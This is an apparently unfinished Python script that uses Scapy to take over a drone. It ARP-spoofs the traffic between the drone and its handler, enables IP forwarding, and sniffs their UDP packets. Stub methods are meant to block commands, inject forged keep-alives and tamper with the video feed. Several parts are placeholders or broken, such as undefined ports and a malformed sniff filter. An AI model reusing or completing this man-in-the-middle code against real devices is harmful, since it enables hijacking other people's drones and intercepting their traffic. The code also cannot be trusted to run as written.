# Writer: Gal Harari
# Date: 19/05/2019$
from scapy.all import *
import signal
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP, Ether


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac,
             psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac,
             psrc=gateway_ip), count=5)

    # kill process on a mac
    # os.kill(os.getpid(), signal.SIGTERM)


class Controller:

    def __init__(self):
        self.drone_ip = ''
        self.handler_ip = ''
        self.drone_mac = ''
        self.handler_mac = ''

        self.s = None

        self.mess_with_video = None
        self.block_to_drone = False

        self.to_drone_conditions = [self._is_pass_to_drone, self._is_block_to_drone]
        self.to_drone_operations = [self._pass_to_drone_f, self._block_to_drone_f]
        self.to_handler_conditions = [self._is_mess_with_video, self._is_pass_video]
        self.to_handler_operations = [self._mess_with_video_f, self._pass_video_f]

        self.spoof_thread = None
        self.communication_thread = None


    # Functions to the user:
    def take_over(self):
        self._set_socket()
        self._get_ips()

        self._spoof()

        self._handle_communication()


    def send_op(self):
        # TODO fill it
        pass


    def block_communication(self):
        # TODO fill it
        pass


    def mess_with_video(self):
        # TODO fill it
        pass


    # End of functions to the user

    def _handle_communication(self):
        h_ip, d_ip = self.handler_ip, self.drone_ip
        p_filter = "( host " + h_ip + " or host " + d_ip + " ) and ( ip proto udp or " \
                                                           "ip6 proto udp )"
        p = sniff(filter=p_filter)
        if p[IP].src == d_ip:
            for i, cond in enumerate(self.to_handler_conditions):
                if cond():
                    send(self.to_handler_operations[i](p))
                    break
        else:
            for i, cond in enumerate(self.to_drone_conditions):
                if cond():
                    send(self.to_drone_operations[i](p))
                    break


    def _set_ips(self, pkt):
        self.drone_ip = pkt[IP].src
        self.handler_ip = pkt[IP].dst


    def _get_ips(self):
        # TODO : find the feature that lets us know it is a package of the drone and
        #  handler, maybe find some udp packets of video with some feature..

        sniff_filter = "\( ip proto udp or ip6 proto udp \) and "
        pkt = sniff(filter=sniff_filter, prn=self._set_ips)


    def _answer_handler(self, pkt):
        # TODO : return the handler the answer he expects to get for the package
        pass


    def _handle_handler_requests(self, handler_ip):
        while True:
            sniff_filter = "ip host " + handler_ip + " and ( ip proto udp or ip6 proto " \
                                                     "udp )"
            sniff(filter=sniff_filter, prn=self._answer_handler)


    def _send_keep_alive(self):
        # TODO : find the form of the keep alive packet tp the drone
        keep_alive_pkt = IP(src=self.drone_ip, dst=self.handler_ip) / UDP(
            sport=src_port,
            dport=dst_port)
        send(keep_alive_pkt)


    def _spoof(self):
        # Enable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=1")

        self.spoof_thread = Thread(target=self._spoof_on_background)
        self.spoof_thread.start()

        print("Started spoofing")
        time.sleep(3)
        print("Now starting activity")


    def _spoof_on_background(self):
        # did this to prevent repeated re-access to another parts of memory,
        # which might slow down things a little
        handler_ip = self.handler_ip
        handler_mac = self.handler_mac
        drone_ip = self.drone_ip
        drone_mac = self.drone_mac

        # first arp_spoof attack
        send(ARP(op=2, pdst=handler_ip, hwdst=handler_mac, psrc=drone_ip), count=5)
        send(ARP(op=2, pdst=drone_ip, hwdst=drone_mac, psrc=handler_ip), count=5)

        # maintenance of the spoofing
        while True:
            send(ARP(op=2, pdst=handler_ip, hwdst=handler_mac, psrc=drone_ip))
            send(ARP(op=2, pdst=drone_ip, hwdst=drone_mac, psrc=handler_ip))
            time.sleep(2)


    def _restore_network(self):
        restore_network(self.handler_ip, self.handler_mac, self.drone_ip, self.drone_mac)


    def _set_socket(self):
        self.s = conf.L3socket(iface='enp3s0')


    def _close_socket(self):
        self.s.close()


    def __del__(self):
        self._restore_network()
        self._close_socket()


    # Conditions:
    # to drone:
    def _is_block_to_drone(self):
        return self.block_to_drone


    def _is_pass_to_drone(self):
        return not self.block_to_drone


    # to handler:
    def _is_mess_with_video(self):
        return self.mess_with_video is not None


    def _is_pass_video(self):
        return self.mess_with_video is None


    # TODO: fill the operations
    # Operations:
    # to drone:
    def _block_to_drone_f(self, pkt):
        self._send_keep_alive()


    def _pass_to_drone_f(self, pkt):
        pass


    # to handler:
    def _mess_with_video_f(self, pkt):
        send(self.mess_with_video(pkt))


    def _pass_video_f(self, pkt):
        pass
